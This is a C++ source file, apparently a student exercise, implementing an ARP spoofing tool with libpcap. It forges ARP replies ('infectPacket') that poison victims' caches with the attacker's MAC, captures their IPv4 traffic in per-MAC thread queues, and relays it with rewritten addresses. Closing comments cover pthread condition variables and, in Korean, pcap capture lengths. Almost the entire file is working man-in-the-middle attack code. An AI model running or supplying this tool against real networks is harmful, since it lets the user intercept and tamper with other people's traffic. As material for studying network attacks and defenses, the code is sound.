#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "iphdr.h"
#include "send.h"

#pragma pack(push, 1)
struct EthIpPacket
{
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

void getDeviceAddress(const char *dev, Ip *ip, Mac *mac)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    strcpy(ifr.ifr_name, dev);
    int sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    ioctl(sd, SIOCGIFADDR, &ifr);
    struct sockaddr_in *addrin = (struct sockaddr_in *)&ifr.ifr_addr;
    uint32_t addr32 = ntohl(addrin->sin_addr.s_addr);
    *ip = Ip(addr32);

    ioctl(sd, SIOCGIFHWADDR, &ifr);
    uint8_t *attackerMac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
    *mac = Mac(attackerMac);

    close(sd);
}

void usage()
{
    printf("syntax : arp-spoof<interface><sender ip 1><target ip 1>[<sender ip 2><target ip 2>...]");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

EthArpPacket EthArpPacket::spoofDefaultPacket()
{
    EthArpPacket packet;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    return packet;
}

EthArpPacket EthArpPacket::broadcastPacket(Mac attackerMac, Ip attackerIp, Ip destIp)
{
    EthArpPacket packet = spoofDefaultPacket();

    packet.eth_.smac_ = attackerMac;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = htonl(attackerIp);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.tip_ = htonl(destIp);
    packet.arp_.tmac_ = Mac::nullMac();
    return packet;
}

EthArpPacket EthArpPacket::infectPacket(Mac attackerMac, Mac senderMac, Ip senderIp, Ip targetIp)
{
    EthArpPacket packet = spoofDefaultPacket();

    packet.eth_.smac_ = attackerMac;
    packet.eth_.dmac_ = senderMac;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.tip_ = htonl(senderIp);
    packet.arp_.tmac_ = senderMac;
    return packet;
}

void EthArpPacket::send(pcap_t *handle)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(this), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

Mac receiveArpReply(pcap_t *handle, Ip ip_from, int *receivedFlag)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;

        EthArpPacket *temp = (EthArpPacket *)packet;
        if (ntohs(temp->eth_.type_) != EthHdr::Arp)
            continue;

        if (temp->arp_.sip_.ntoh() == ip_from)
        {
            *receivedFlag = 1;
            return temp->eth_.smac_;
        }
    }
}

#include <set>
#include <map>
#include <queue>

// by src mac
std::map<Mac, std::queue<u_char *>> pipeByMac;
std::map<Mac, pthread_cond_t *> condByMac;
std::map<Mac, pthread_mutex_t *> mutexByMac;

void *producePacket(void *param)
{
    ProduceParam *p = (ProduceParam *)param;
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (true)
    {
        int res = pcap_next_ex(p->handle, &header, &packet);
        if (res == 0)
            continue;
        EthHdr *temp = (EthHdr *)packet;
        if (temp->type() != EthHdr::Ip4)
            continue;
        // if (temp->dmac() != p->attackerMac)
        //     continue;
        Mac srcMac = temp->smac();
        if (pipeByMac.find(srcMac) == pipeByMac.end())
            continue;

        u_char *product = (u_char *)malloc(sizeof(u_char) * header->len);
        memcpy(product, packet, header->len);
        pthread_cond_t *cond = condByMac[srcMac];
        pthread_mutex_t *mutex = mutexByMac[srcMac];
        pthread_mutex_lock(mutex);
        pipeByMac[srcMac].push(product);
        printf("produce %s len %d\n", std::string(srcMac).c_str(), header->caplen);
        pthread_cond_signal(cond);
        pthread_mutex_unlock(mutex);
    }
}

void registerMac(Mac mac, pthread_cond_t *cond, pthread_mutex_t *mutex)
{
    if (pipeByMac.find(mac) == pipeByMac.end())
    {
        pipeByMac[mac] = std::queue<u_char *>();
        condByMac[mac] = cond;
        mutexByMac[mac] = mutex;
    }
}

u_char *consumePacketBySrcMac(Mac mac)
{
    pthread_cond_t *cond = condByMac[mac];
    pthread_mutex_t *mutex = mutexByMac[mac];
    pthread_mutex_lock(mutex);
    if (pipeByMac[mac].size() == 0)
    {
        pthread_cond_wait(cond, mutex);
    }
    u_char *v = pipeByMac[mac].front();
    pipeByMac[mac].pop();
    pthread_mutex_unlock(mutex);
    return v;
}

void relay(pcap_t *handle, u_char *packet, int len)
{
    EthIpPacket *payload = (EthIpPacket *)packet;
    printf("relay %s -> %s\n", std::string(payload->eth_.smac()).c_str(), std::string(payload->eth_.dmac()).c_str());
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet), len);
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

void *spoof(void *param)
{
    SpoofParams *s = (SpoofParams *)param;
    while (true)
    {
        u_char *packet = consumePacketBySrcMac(s->smac);
        EthIpPacket *payload = (EthIpPacket *)packet;
        int len = payload->ip_.len() + 14;
        printf("packet consume length %d\n", len);
        payload->eth_.smac_ = s->amac;
        payload->eth_.dmac_ = s->dmac;
        relay(s->handle, packet, len);
        free(packet);
    }
}

// unused
//  std::set<Ip> ips;
//  void registerIp(Ip ip)
//  {
//      ips.insert(ip);
//  }

// register mutex and cond on queue?

// thread 1 : pthread_mutex_lock(&mutex);
// while (!condition)
//     pthread_cond_wait(&cond, &mutex);
// /* do something that requires holding the mutex and condition is true */
// pthread_mutex_unlock(&mutex);

// thread2 : pthread_mutex_lock(&mutex);
// /* do something that might make condition true */
// pthread_cond_signal(&cond);
// pthread_mutex_unlock(&mutex);

// packet을 받기전에 앞으로 받을 packet의 최대 길이를 설정할 수 있다는 것 같습니다.
// 예를 들면, pcap은 packet 단위로 데이터를 가져다 주는데 이번에 들어온 packet은 길이가 100입니다.
// 그런데 처음에 한 번에 읽을 최대 길이를 60으로 설정했다면
// 실제 읽은 데이터 길이 (caplen) 은 60이 되고 capture한 packet의 실제 길이 (len)은 100이 됩니다.